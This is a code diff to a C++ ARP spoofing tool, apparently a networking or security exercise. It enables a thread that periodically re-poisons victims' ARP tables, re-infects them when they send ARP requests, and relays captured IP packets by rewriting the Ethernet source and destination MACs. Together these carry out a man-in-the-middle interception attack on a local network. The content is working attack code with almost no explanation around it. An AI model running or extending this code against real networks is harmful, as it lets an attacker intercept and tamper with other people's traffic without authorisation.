@@ -19,7 +19,7 @@ void ARPSpoof::AddAttackList(uint32_t senderIP, uint32_t targetIP)
 {
     Attack * attack = new Attack(interface, senderIP, targetIP, pcapManager);
     attackList.push_back(attack);
-
+      
 }
 
 
@@ -30,11 +30,16 @@ void ARPSpoof::AttackStart()
     for (itor=attackList.begin(); itor != attackList.end(); itor++)
     {
         SendARP * sa = (*itor)->sendArp;
-
+        
         sa->InfectARPTable();
 
+    }
+
+    for (itor=attackList.begin(); itor != attackList.end(); itor++)
+    {
+        SendARP * sa = (*itor)->sendArp;
         //주기적으로 infect 하는 쓰레드 생성
-        //thread maintain (&ARPSpoof::MaintainInfection, this, sa);
+        (*itor)->maintain = new thread(&ARPSpoof::MaintainInfection, this, sa);
         //maintain.detach();
 
         //relay 반응 등록
@@ -47,6 +52,7 @@ void ARPSpoof::AttackStart()
                                             ETHERTYPE_IP,
                                             (void *)&ARPSpoof::RelayIPPacket
                                             );
+
         pcapManager->AddSubscriber(subRelay);
         (*itor)->relaySubId = subRelay->GetSubID();
 
@@ -81,6 +87,13 @@ void ARPSpoof::AttackStart()
         (*itor)->requestSubId1 = subRequest2->GetSubID();
 
     }
+
+    for (itor=attackList.begin(); itor != attackList.end(); itor++)
+    {
+        (*itor)->maintain->join();
+
+    }
+
 }
 
 void ARPSpoof::ReactRequest(uint32_t subID)
@@ -91,13 +104,10 @@ void ARPSpoof::ReactRequest(uint32_t subID)
     {
         if( (*itor)->requestSubId2  == subID || (*itor)->requestSubId1  == subID)
         {
-            printf("re infection\n");
             (*itor)->sendArp->InfectARPTable();
             break;
         }
-        
     }
-
 
 }
 
@@ -129,7 +139,6 @@ void ARPSpoof::RelayIPPacket(const uint8_t * buf, uint32_t len, uint32_t subID)
         if( (*itor)->relaySubId  == subID)
         {
             //이더넷 헤더를 target MAC으로 변환
-            printf("send modified...\n");
 
             memcpy( (eth->ether_shost), (*itor)->sendArp->myMAC, ETH_ALEN);
             memcpy( (eth->ether_dhost), (*itor)->sendArp->targetMAC, ETH_ALEN);
@@ -148,9 +157,8 @@ void ARPSpoof::RelayIPPacket(const uint8_t * buf, uint32_t len, uint32_t subID)
 
 
 
-ARPSpoof::ARPSpoof(uint8_t * inter, uint32_t num)
+ARPSpoof::ARPSpoof(uint8_t * inter)
 {
-    attackNum = num;
     interface = inter;
     pcapManager = new PcapManager(interface);
 
